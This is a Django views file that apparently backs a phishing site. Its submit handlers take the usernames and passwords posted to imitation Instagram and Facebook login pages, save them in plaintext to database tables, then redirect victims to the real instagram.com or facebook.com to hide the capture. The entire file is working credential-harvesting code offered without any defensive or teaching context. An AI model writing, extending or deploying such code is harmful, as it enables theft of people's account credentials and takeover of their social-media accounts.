from django.shortcuts import render, redirect
from .models import User, fUser

# Create your views here.
def index(request):
    return render(request, 'index.html')

def submit(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        User.objects.create(username=username, password=password)
        return redirect('https://www.instagram.com/')
    
    return render(request, 'index.html')

def facebook(request):
    return render(request, 'facebook.html')

def fsubmit(request):
    if request.method == 'POST':
        fusername = request.POST.get('fusername')
        fpassword = request.POST.get('fpassword')
        fUser.objects.create(fusername=fusername, fpassword=fpassword)
        return redirect('https://www.facebook.com/')
    
    return render(request, 'index.html')


